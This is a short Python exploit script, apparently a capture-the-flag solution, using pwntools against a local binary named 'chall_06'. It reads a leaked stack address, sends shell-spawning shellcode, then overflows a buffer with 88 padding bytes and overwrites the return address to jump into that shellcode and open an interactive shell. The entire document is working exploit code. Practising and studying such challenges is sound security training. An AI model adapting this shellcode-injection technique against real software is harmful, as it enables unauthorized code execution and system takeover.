#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_06')

p = process(binary.path)

p.recvuntil('I drink milk even though i\'m lactose intolerant: ')
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)

payload  = b''
payload += 88 * b'A'
payload += p64(stack)

p.sendline(payload)
p.interactive()
